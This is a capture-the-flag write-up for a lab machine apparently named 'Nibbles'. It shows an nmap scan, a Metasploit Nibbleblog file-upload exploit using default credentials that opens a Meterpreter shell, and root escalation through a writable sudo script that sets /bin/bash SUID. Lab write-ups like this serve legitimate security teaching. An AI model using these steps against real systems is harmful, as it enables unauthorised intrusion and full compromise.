# Nibbles

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.144    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 11:33 EDT
Nmap scan report for 10.129.85.144
Host is up (0.0093s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### NIbbleblog RCE

Visiting port 80 reveals nothing, until you read the comments:

```markup
$ curl http://10.129.85.144/                
<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

<figure><img src="../../../.gitbook/assets/image (170) (2).png" alt=""><figcaption></figcaption></figure>

Based on the Nibbleblog Github Repo (which is no longer continued), I found that we can access `/README` to view the version used.

```
$ curl http://10.129.85.144/nibbleblog/README
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
<TRUNCATED>
```

There are RCE exploits for this, and I'm going to use`msfconsole` to exploit it. In specific, I want to use the `multi/http/nibbleblog_file_upload` module.&#x20;

```
set RHOSTS <ip>
set LHOST <my ip>
set TARGETURI /nibbleblog
set USERNAME admin # default creds
set PASSWORD nibbles # default creds
exploit
```

This would spawn us a Meterpreter shell.

<figure><img src="../../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Writeable Sudo Script

We can check `sudo` privileges:

```
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

There is no script there, so we can create our own that makes `/bin/bash` an SUID binary.

```
$ sudo /home/nibbler/personal/stuff/monitor.sh             
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
```

Then, we can easily get `root`.&#x20;

<figure><img src="../../../.gitbook/assets/image (167) (3).png" alt=""><figcaption></figcaption></figure>
